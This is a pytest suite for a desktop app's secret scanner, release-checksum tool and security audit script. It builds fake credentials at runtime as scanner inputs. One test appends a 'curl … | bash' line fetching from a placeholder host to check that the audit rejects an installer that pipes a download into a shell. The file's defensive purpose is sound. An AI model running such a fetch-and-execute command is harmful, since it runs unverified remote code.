"""Row 555 (row545 V14-V19, V22): secret scanner, release checksums and security audit."""

from __future__ import annotations

import hashlib
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import uuid
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
SCANNER_PY = ROOT / "scripts" / "check_secrets.py"
AUDIT_SH = ROOT / "scripts" / "security_audit.sh"
VERSION = "3.1.0"
PKG = f"MLX.Studio-{VERSION}.pkg"
DMG = f"MLX.Studio-{VERSION}.dmg"


def load(path: Path):
    spec = importlib.util.spec_from_file_location(f"m_{uuid.uuid4().hex}", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def clean_env(home: Path, **extra: str) -> dict[str, str]:
    env = {k: v for k, v in os.environ.items() if not k.startswith(("GIT_", "MLX_"))}
    env.update(
        HOME=str(home),
        PATH=os.pathsep.join([str(Path(sys.executable).parent), os.environ["PATH"]]),
        GIT_CONFIG_GLOBAL=os.devnull,
        GIT_CONFIG_NOSYSTEM="1",
        GIT_CEILING_DIRECTORIES=str(home),
        PYTHONDONTWRITEBYTECODE="1",
        **extra,
    )
    return env


def git(root: Path, env: dict, *args: str) -> None:
    subprocess.run(["git", *args], cwd=root, env=env, check=True, capture_output=True)


# Every credential shape is assembled at runtime, so no line here matches a rule.
TOKEN = "ghp_" + "Qw7" * 12
PW_KEY = "pass" + "word"
API_KEY = "api" + "_key"
SCHEME = "postgres:" + "//"

SCANNER = load(SCANNER_PY)


def scan(line: str) -> list:
    findings: list = []
    SCANNER.scan_text("config.txt", line + "\n", findings)
    return findings


def assignment(key: str, value: str) -> str:
    return f'{key} = "{value}"'


def db_url(password: str, user: str = "app") -> str:
    return f"{SCHEME}{user}:{password}@db.internal/app"


# ── V14: a dollar sign inside a real value is not a placeholder ──────────────
@pytest.mark.parametrize(
    "value",
    [
        "Zq9$tLm2vXw8",
        "Zq9$TLM2vXw8",
        "Zq9${t}Lm2vXw8",
        "$Zq9tLm2vXw8!",
        "$zqtlmvxwpr",
        "${DB_PASS}Zq9tLm2",
    ],
    ids=["lower", "upper", "braces", "leading", "lowercase-bare", "ref-plus-literal"],
)
@pytest.mark.parametrize(
    ("rule", "make"),
    [
        ("SEC-020", lambda v: assignment(PW_KEY, v)),
        ("SEC-021", lambda v: assignment(API_KEY, v + "kJ4")),
        ("SEC-023", db_url),
    ],
    ids=["password", "api-key", "db-url"],
)
def test_a_dollar_sign_inside_a_value_is_still_reported(rule, make, value):
    findings = scan(make(value))
    assert [f.rule for f in findings] == [rule]
    assert value not in findings[0].render()


def test_a_variable_user_name_does_not_excuse_a_literal_password():
    assert [f.rule for f in scan(db_url("Zq9tLm2vXw8", "$DB_USER"))] == ["SEC-023"]


@pytest.mark.parametrize(
    "line",
    [
        assignment(PW_KEY, "$DB_PASSWORD"),
        assignment(PW_KEY, "${db_password}"),
        assignment(API_KEY, "${SERVICE_API_KEY}"),
        db_url("$DB_PASS"),
        db_url("${db_pass}", "${db_user}"),
    ],
    ids=["bare", "braces", "api-braces", "url-bare", "url-braces"],
)
def test_a_value_that_is_only_a_variable_reference_stays_allowed(line):
    assert scan(line) == []


# ── V15: a warning never hides a blocking finding ────────────────────────────
BEARER = "Authorization: Bear" + "er " + "Ab3" * 10


def test_a_block_rule_wins_over_an_earlier_warning_on_the_same_line():
    findings = scan(f"{BEARER} {db_url('Zq9tLm2vXw8')}")
    assert [(f.rule, f.severity) for f in findings] == [("SEC-023", "block")]


def test_a_warning_alone_is_reported_once():
    assert [(f.rule, f.severity) for f in scan(BEARER)] == [("SEC-022", "warn")]


# ── V18: files that are not UTF-8 ────────────────────────────────────────────
def scan_repo(tmp_path: Path, data: bytes, mode: list[str]) -> subprocess.CompletedProcess:
    root = tmp_path / "repo"
    (root / "scripts").mkdir(parents=True)
    env = clean_env(tmp_path)
    shutil.copy(SCANNER_PY, root / "scripts")
    (root / "notes.txt").write_bytes(data)
    git(root, env, "init", "-q", "-b", "main")
    git(root, env, "add", "-A")
    if mode == ["--all-history"]:
        who = ("-c", "user.name=t", "-c", "user.email=t@invalid")
        git(root, env, *who, "commit", "-q", "-m", "notes")
    return subprocess.run(
        [sys.executable, str(root / "scripts" / "check_secrets.py"), *mode],
        cwd=root,
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )


MODES = [[], ["--staged"], ["--all-history"]]


@pytest.mark.parametrize("mode", MODES, ids=["tree", "staged", "history"])
def test_a_clean_latin1_file_does_not_crash_the_scanner(tmp_path, mode):
    done = scan_repo(tmp_path, "caf\xe9\n".encode("latin-1"), mode)
    assert done.returncode == 0, done.stderr
    assert "Traceback" not in done.stderr


@pytest.mark.parametrize("mode", MODES, ids=["tree", "staged", "history"])
@pytest.mark.parametrize("encoding", ["latin-1", "utf-16"])
def test_a_token_in_a_non_utf8_file_is_reported(tmp_path, mode, encoding):
    text = f"caf\xe9\ntoken = {TOKEN}\n"
    done = scan_repo(tmp_path, text.encode(encoding), mode)
    assert done.returncode == 1, done.stdout + done.stderr
    assert "notes.txt:2" in done.stdout
    assert TOKEN not in done.stdout + done.stderr


# ── V19: a listed checksum is never changed silently ─────────────────────────
class Release:
    def __init__(self, base: Path, monkeypatch):
        for key in [k for k in os.environ if k.startswith("GIT_")]:
            monkeypatch.delenv(key)
        monkeypatch.setenv("HOME", str(base))
        monkeypatch.setenv("GIT_CEILING_DIRECTORIES", str(base))
        self.root = base / "project"
        for folder in ("packaging", "release", "dist"):
            (self.root / folder).mkdir(parents=True)
        shutil.copy(ROOT / "packaging" / "release_manifest.py", self.root / "packaging")
        (self.root / "app.py").write_text(f'APP_VERSION = "{VERSION}"\n', encoding="utf-8")
        self.mod = load(self.root / "packaging" / "release_manifest.py")
        # The payload check needs a real flat package; it has its own tests.
        monkeypatch.setattr(self.mod, "check_payload", lambda pkg: [])
        self.latest = self.root / "release" / "latest.json"
        self.sums = self.root / "release" / "SHA256SUMS"
        self.build()

    def build(self, pkg: bytes = b"pkg-bytes", dmg: bytes = b"dmg-bytes") -> None:
        dist = self.root / "dist"
        (dist / PKG).write_bytes(pkg)
        (dist / DMG).write_bytes(dmg)
        (dist / "SHA256SUMS").write_text(
            f"{sha(dmg)}  {DMG}\n{sha(pkg)}  {PKG}\n", encoding="utf-8"
        )

    def run(self, *args: str) -> int:
        return self.mod.main(["--dist", str(self.root / "dist"), *args])

    def release_files(self) -> tuple:
        return tuple(p.read_bytes() if p.exists() else None for p in (self.latest, self.sums))


@pytest.fixture
def release(tmp_path, monkeypatch):
    return Release(tmp_path, monkeypatch)


@pytest.mark.parametrize(
    "rebuilt", [{"pkg": b"second"}, {"dmg": b"second"}], ids=["pkg-differs", "dmg-differs"]
)
def test_generate_refuses_to_change_a_listed_checksum(release, rebuilt, capsys):
    assert release.run() == 0
    before = release.release_files()
    release.build(**rebuilt)
    assert release.run() == 1
    assert release.release_files() == before
    assert "--replace" in capsys.readouterr().err


def test_generate_replaces_a_listed_checksum_only_when_told_to(release):
    assert release.run() == 0
    release.build(pkg=b"second")
    assert release.run("--replace") == 0
    assert f"{sha(b'second')}  {PKG}\n" in release.sums.read_text(encoding="utf-8")
    assert len(release.sums.read_text(encoding="utf-8").splitlines()) == 2


def test_generate_can_be_repeated_for_the_same_build(release):
    assert release.run() == 0
    assert release.run() == 0


def test_generate_refuses_to_change_a_manifest_that_has_no_list(release):
    assert release.run() == 0
    release.sums.unlink()
    before = release.release_files()
    release.build(pkg=b"second")
    assert release.run() == 1
    assert release.release_files() == before


@pytest.mark.parametrize("given", [None, sha(b"a local dmg"), "abc"], ids=["none", "other", "bad"])
def test_backfill_refuses_an_unconfirmed_dmg(release, given):
    assert release.run() == 0
    release.sums.unlink()
    extra = [] if given is None else ["--dmg-sha256", given]
    assert release.run("--backfill", *extra) == 1
    assert not release.sums.exists()


@pytest.mark.parametrize(
    "form", [str, str.upper, lambda h: f"sha256:{h}"], ids=["hex", "upper", "github-digest"]
)
def test_backfill_lists_a_dmg_that_matches_the_published_checksum(release, form):
    assert release.run() == 0
    release.sums.unlink()
    assert release.run("--backfill", "--dmg-sha256", form(sha(b"dmg-bytes"))) == 0
    assert f"{sha(b'dmg-bytes')}  {DMG}\n" in release.sums.read_text(encoding="utf-8")


# ── V16, V17, V18, V22: security_audit.sh behaviour ──────────────────────────
PIP_AUDIT_STUB = """\
import os
import sys
from pathlib import Path

with (Path(__file__).parent.parent / "calls.log").open("a", encoding="utf-8") as log:
    print(*sys.argv[1:], file=log)
advisory = os.environ.get("STUB_ADVISORY", "")
print(advisory)
sys.exit(1 if advisory else 0)
"""


class Audit:
    """A throwaway git tree that the real audit script runs in."""

    def __init__(self, base: Path):
        self.root = base / "audit"
        self.home = base / "home"
        self.home.mkdir()
        for folder in ("scripts", "packaging", "ui", "release"):
            (self.root / folder).mkdir(parents=True)
        for name in ("security_audit.sh", "check_secrets.py", "install.sh"):
            shutil.copy(ROOT / "scripts" / name, self.root / "scripts")
        shutil.copy(ROOT / "packaging" / "release_manifest.py", self.root / "packaging")
        self.bundled = load(self.root / "packaging" / "release_manifest.py").BUNDLED
        for name in self.bundled:
            self.write(name, f"// {name}\n" if name.endswith(".js") else f"# {name}\n")
        # The least each source check needs, so a clean tree exits 0.
        self.write(
            "app.py",
            'HOST = "127.0.0.1"\n'
            "# STATIC_FILES.get(rel) _build_static_allowlist MAX_BODY\n"
            "# stop the API server first; truststore.inject_into_ssl\n",
        )
        self.write(".gitignore", "dist/\n*.dmg\n*.app/\n__pycache__/\n.env\n*.safetensors\n")
        # The real pip-audit reaches PyPI, so every run gets a stand-in that
        # shadows it, records its arguments and fails when given an advisory.
        stub = base / "stub" / "pip_audit"
        stub.mkdir(parents=True)
        (stub / "__init__.py").write_text("", encoding="utf-8")
        (stub / "__main__.py").write_text(PIP_AUDIT_STUB, encoding="utf-8")
        self.pip_audit_calls = base / "stub" / "calls.log"
        self.env = clean_env(self.home, PYTHONPATH=str(stub.parent))
        git(self.root, self.env, "init", "-q", "-b", "main")

    def write(self, name: str, text: str) -> Path:
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        path.chmod(0o644)
        return path

    def bundle(self) -> Path:
        resources = self.root / "dist" / "MLX Studio.app" / "Contents" / "Resources"
        for name in self.bundled:
            (resources / name).parent.mkdir(parents=True, exist_ok=True)
            shutil.copy(self.root / name, resources / name)
        return resources

    def run(self, *args: str, platform: str = "linux", **env: str) -> tuple[int, str]:
        git(self.root, self.env, "add", "-A")  # dist/ is ignored
        extra = {"MLX_AUDIT_PLATFORM": platform} if platform else {}
        done = subprocess.run(
            ["bash", str(self.root / "scripts" / "security_audit.sh"), *(args or ["--quick"])],
            capture_output=True,
            text=True,
            env={**self.env, **extra, **env},
            timeout=120,
            check=False,
        )
        return done.returncode, re.sub(r"\x1b\[[0-9;]*m", "", done.stdout + done.stderr)


def results(output: str, check: str) -> list[str]:
    lines = [line.split() for line in output.splitlines()]
    verdicts = ("PASS", "FAIL", "WARN", "INFO")
    return [" ".join(w) for w in lines if w[:1] and w[0] in verdicts and w[1:2] == [check]]


def failed(output: str, check: str) -> list[str]:
    return [line for line in results(output, check) if line.startswith("FAIL")]


@pytest.fixture
def audit(tmp_path):
    return Audit(tmp_path)


def test_a_clean_tree_passes_the_whole_audit(audit):
    audit.bundle()
    code, output = audit.run(platform="linux")
    assert code == 0, output


def test_sa05_finds_the_delete_guard_by_its_current_words(audit):
    # The words app.py answers with when a held model is to be deleted.
    real = (ROOT / "app.py").read_text("utf-8")
    assert 'return "stop the API server first"' in real
    _, output = audit.run()
    assert "PASS SA-05 delete refuses a model the server holds" in results(output, "SA-05")


def test_sa05_warns_when_the_delete_guard_is_gone(audit):
    app = audit.root / "app.py"
    audit.write("app.py", app.read_text("utf-8").replace("stop the API server first", "gone"))
    _, output = audit.run()
    assert "WARN SA-05 loaded-model delete guard not found" in results(output, "SA-05")


def test_sa07_passes_a_clean_tree(audit):
    _, output = audit.run()
    assert results(output, "SA-07")[0].startswith("PASS"), output


def test_sa07_counts_findings_without_printing_them(audit):
    audit.write("config.txt", f"token = {TOKEN}\n")
    code, output = audit.run()
    assert code == 1
    assert "credentials found: 1 blocking" in failed(output, "SA-07")[0]
    assert TOKEN not in output


@pytest.mark.parametrize(
    "broken",
    ["raise SystemExit(2)\n", "raise ValueError('boom')\n", "def (:\n"],
    ids=["usage-error", "crash", "syntax-error"],
)
def test_sa07_reports_a_broken_scanner_as_an_error(audit, broken):
    audit.write("scripts/check_secrets.py", broken)
    code, output = audit.run()
    line = failed(output, "SA-07")[0]
    assert code == 1
    assert "scanner failed" in line
    assert "credentials found" not in line


@pytest.mark.parametrize("platform", ["", "linux"], ids=["native", "linux"])
@pytest.mark.parametrize("mode", [0o644, 0o664, 0o775], ids=oct)
def test_sa09_accepts_files_others_cannot_write(audit, mode, platform):
    audit.write("notes.txt", "x\n").chmod(mode)
    _, output = audit.run(platform=platform)
    assert results(output, "SA-09") == ["PASS SA-09 no world-writable tracked files"]


@pytest.mark.parametrize("platform", ["", "linux"], ids=["native", "linux"])
@pytest.mark.parametrize("mode", [0o666, 0o646, 0o602, 0o777], ids=oct)
def test_sa09_fails_a_world_writable_file(audit, mode, platform):
    audit.write("notes.txt", "x\n").chmod(mode)
    code, output = audit.run(platform=platform)
    assert code == 1
    assert "notes.txt" in failed(output, "SA-09")[0]


MANIFEST = {"version": VERSION, "url": "https://example.invalid/a.pkg", "size": 1}


def stub_release_tool(audit: Audit, status: int) -> None:
    audit.write("release/latest.json", json.dumps({**MANIFEST, "sha256": "a" * 64}))
    audit.write(
        "packaging/release_manifest.py",
        f"import sys\nBUNDLED = ('app.py',)\nif __name__ == '__main__':\n"
        f"    print('args', *sys.argv[1:])\n    sys.exit({status})\n",
    )


@pytest.mark.parametrize(("status", "verdict"), [(0, "PASS"), (1, "FAIL")])
def test_sa12_release_follows_the_release_gate(audit, status, verdict):
    stub_release_tool(audit, status)
    _, output = audit.run("--quick", "--release")
    assert "args --verify --release --dist dist" in output
    gate = [line for line in results(output, "SA-12") if "release gate" in line]
    assert [line.split()[0] for line in gate] == [verdict], output


def test_sa12_release_gate_runs_only_with_release(audit):
    stub_release_tool(audit, 1)
    _, output = audit.run()
    assert not failed(output, "SA-12"), output


def test_sa12_release_fails_without_a_manifest(audit):
    code, output = audit.run("--quick", "--release")
    assert code == 1
    assert "no release/latest.json" in failed(output, "SA-12")[0]


def test_sa12_release_fails_on_the_real_gate_without_a_build(audit):
    audit.write("release/latest.json", json.dumps({**MANIFEST, "sha256": "a" * 64}))
    _, output = audit.run("--quick", "--release")
    assert any("release gate failed" in line for line in failed(output, "SA-12")), output


def test_sa13_reports_what_pip_audit_found(audit):
    audit.write("requirements.txt", "")
    code, output = audit.run("--release", STUB_ADVISORY="STUB-ADVISORY")
    assert code == 1
    assert "STUB-ADVISORY" in failed(output, "SA-13")[0]


def test_sa13_passes_when_pip_audit_finds_nothing(audit):
    _, output = audit.run("--release")
    assert results(output, "SA-13") == [
        "PASS SA-13 pip-audit: no known vulnerabilities in runtime dependencies"
    ]
    (call,) = audit.pip_audit_calls.read_text(encoding="utf-8").splitlines()
    assert call.startswith("--progress-spinner off -r ")


def test_sa13_quick_does_not_run_pip_audit(audit):
    _, output = audit.run("--quick", STUB_ADVISORY="STUB-ADVISORY")
    assert results(output, "SA-13") == ["INFO SA-13 skipped (--quick)"]
    assert not audit.pip_audit_calls.exists()


def test_the_audit_uses_no_fixed_tmp_file():
    assert "/tmp/" not in AUDIT_SH.read_text(encoding="utf-8")


def test_sa15_compares_every_shipped_file(audit):
    audit.bundle()
    _, output = audit.run()
    assert results(output, "SA-15") == [
        f"PASS SA-15 bundled {name} matches the working tree" for name in audit.bundled
    ]


@pytest.mark.parametrize("fault", ["stale", "missing"])
@pytest.mark.parametrize(
    "name", ["app.py", "mlx_guard.py", "ui/index.html", "ui/style.css", "ui/app.js"]
)
def test_sa15_fails_on_any_wrong_shipped_file(audit, name, fault):
    path = audit.bundle() / name
    if fault == "stale":
        path.write_text("old\n", encoding="utf-8")
    else:
        path.unlink()
    code, output = audit.run()
    assert code == 1
    assert [line for line in failed(output, "SA-15") if f" {name} " in line], output


def test_sa15_fails_when_the_shipped_list_cannot_be_read(audit):
    audit.bundle()
    audit.write("packaging/release_manifest.py", "raise SystemExit(3)\n")
    _, output = audit.run()
    assert "shipped file list" in failed(output, "SA-15")[0]


@pytest.mark.parametrize(("args", "verdict"), [(["--quick"], "WARN"), (["--release"], "FAIL")])
def test_sa15_does_not_pass_quietly_without_the_release_tool(audit, args, verdict):
    audit.bundle()
    (audit.root / "packaging" / "release_manifest.py").unlink()
    _, output = audit.run(*args)
    assert any(x.startswith(verdict) and "file list" in x for x in results(output, "SA-15"))


def test_build_script_copies_every_file_the_audit_compares():
    script = (ROOT / "packaging" / "build_app.sh").read_text(encoding="utf-8")
    shipped = load(ROOT / "packaging" / "release_manifest.py").BUNDLED
    assert {f"ui/{p.name}" for p in (ROOT / "ui").iterdir() if p.is_file()} <= set(shipped)
    for name in shipped:
        assert f"$ROOT/{name}" in script, name


def test_sa16_passes_the_project_installer(audit):
    _, output = audit.run()
    lines = results(output, "SA-16")
    assert len(lines) == 6 and all(line.startswith("PASS") for line in lines), output


@pytest.mark.parametrize(
    ("edit", "message"),
    [
        (lambda s: s + "\nif then\n", "syntax error"),
        (lambda s: s.replace("shasum -a 256", "true"), "does not verify a checksum"),
        (lambda s: s.replace("codesign --verify", "true"), "does not verify the signature"),
        (lambda s: s + "\ncurl -fsSL https://example.invalid/x | bash\n", "pipes a download"),
    ],
    ids=["syntax", "checksum", "signature", "piped"],
)
def test_sa16_fails_on_an_unsafe_installer(audit, edit, message):
    path = audit.root / "scripts" / "install.sh"
    path.write_text(edit(path.read_text(encoding="utf-8")), encoding="utf-8")
    code, output = audit.run()
    assert code == 1
    assert any(message in line for line in failed(output, "SA-16")), output
